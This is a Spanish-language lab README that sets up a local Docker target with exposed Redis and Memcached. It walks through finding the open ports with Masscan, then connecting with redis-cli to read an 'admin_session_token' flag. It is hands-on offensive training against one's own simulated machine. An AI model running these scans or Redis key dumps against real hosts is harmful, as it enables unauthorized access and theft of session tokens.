#  Masscan Target: Cachés en Memoria Expuestas

Has completado Nmap. Ahora pasamos a la **herramienta análoga: Masscan**.

Mientras que **Nmap** es como un investigador detallista usando una linterna para analizar todo en profundidad, **Masscan** es como encender los faros antiniebla de un estadio para ver a dónde ir al instante. Masscan puede escanear **todo Internet (IPv4)** en 6 minutos buscando agujeros de seguridad como bases de datos mal configuradas.

##  1. Levantar el Entorno (Target)

Nuestra máquina víctima de hoy tiene sus memorias caché (Redis y Memcached) expuestas por error a "Internet" (simulado localmente). Su servidor web advierte sobre esto... pero ya es tarde.

Ejecuta este comando en la carpeta `masscan.pc`:

```bash
docker compose up --build -d
```

> **NOTA:** Una vez levantado, visita `http://localhost` en tu navegador para ver la web de advertencia generada por el servidor Node.js.

---

## 2. Práctica: Ataque Masivo con Masscan

### Paso 2.1: Instalar Masscan (Requisito)
Masscan no suele venir preinstalado. Si no lo tienes:
```bash
sudo apt update
sudo apt install -y masscan
```

### Paso 2.2: El Escaneo Ultrarrápido
Los criminales usan Masscan para buscar servidores Redis en el puerto **6379** en bloques enormes de IP. 

**¡ATENCIÓN CON MASSCAN Y LOCALHOST!** 
Masscan construye sus propios paquetes de red saltándose el sistema operativo para ser súper rápido. Por esta razón, **¡NO ESCANEA `127.0.0.1` NI `localhost` CORRECTAMENTE!** 

En su lugar, debes decirle a Masscan que escanee la IP local de tu computadora en la red Wi-Fi/LAN (ej. `192.168.1.X`), o bien, la IP interna de Docker. 

Para encontrar tu IP real, ejecuta en otra terminal: `ip a` (Busca la inet de tu tarjeta eth0 o wlan0). Supongamos que tu IP es `192.168.1.15`, el comando será:

```bash
sudo masscan 192.168.1.15 -p6379,11211,80 --rate=1000
```
*(Cambiando `192.168.1.15` por la IP que te haya dado el comando `ip a`)*

 **¿Qué ves?**
Masscan detectará de manera casi **instantánea** los puertos si usaste tu IP real. A diferencia de Nmap, no mostrará versiones, advertencias ni datos precisos. Solo te dirá "Discovered open port X". Así de simple y rápido.

### Paso 2.3: La Explotación Manual
Masscan ya hizo su trabajo: Te dijo *dónde* está el hoyo. Ahora, como atacante, ingresas al agujero que encontraste (Redis en el puerto 6379) y robas los datos, dado que está abierto sin contraseña.

Necesitamos la herramienta `redis-cli` (el cliente oficial de Redis). Instálala en tu sistema si no la tienes:
```bash
sudo apt install -y redis-tools
```

Ahora, conéctate a la memoria caché de la máquina víctima:
```bash
redis-cli -h 127.0.0.1 -p 6379
```

Una vez dentro (tu consola cambiará y dirá `127.0.0.1:6379>`), busca qué llaves existen en la memoria escribiendo:
```bash
KEYS *
```

¡Ajá! Encontrarás la llave `admin_session_token`. Róbala pidiendo su valor con este comando:
```bash
GET admin_session_token
```

 ¡Misión cumplida! Conseguiste la **FLAG** que simula un robo de información sensible.

---

## Limpieza del Entorno

```bash
docker compose down
```
